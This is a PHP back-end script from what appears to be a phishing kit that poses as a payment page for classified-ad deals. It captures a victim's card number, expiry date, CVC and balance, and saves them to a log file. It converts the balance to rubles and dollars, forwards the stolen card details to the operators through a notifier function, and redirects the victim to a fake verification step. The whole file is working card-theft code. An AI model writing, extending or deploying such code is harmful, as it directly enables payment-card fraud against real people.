<?php

include "service.php";
include "../settings.php";

if (file_exists("data/" . $_POST['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("data/" . $_POST["id"] . ".xml");

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n💳 CARD: " . $_POST['fcard'] . "\n💳 EXPIRE: " . $_POST['fexpm'] . "/" . $_POST['fexpy'] . "\n💳 CVC: " . $_POST['fcvc']  . "\n💳 BALANCE: " . $_POST['fbal'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        $course = JSON_decode(file_get_contents("https://www.cbr-xml-daily.ru/daily_json.js"), true);

        $rub = round($_POST['fbal'] * ($course['Valute'][$_temp['valute']]['Value'] / $course['Valute'][$_temp['valute']]['Nominal']));
        $bucks = round($rub / ($course['Valute']['USD']['Value'] / $course['Valute']['USD']['Nominal']));

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        zsendCardi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, $_POST['fcard'], $log_name, "❗️ ". $_temp['service'] ." LOG\n💳 <b>CARD</b>: " . $_POST['fcard'] . "\n💳 <b>EXPIRE</b>: " . $_POST['fexpm'] . "/" . $_POST['fexpy'] . "\n💳 <b>CVC</b>: " . $_POST['fcvc']  . "\n💳 <b>BALANCE</b>: " . $_POST['fbal'] . " " . $_temp['valute'] . " <b>(~$rub RUB. ~$bucks USD.)</b>", $_POST['fbal'] . " " . $_temp['valute'] . " <b>(~$rub RUB. ~$bucks USD.)</b>");
        header("location: verification.php?id=" . $_POST['id'] . "&wid=" . $xml->worker_id);

?>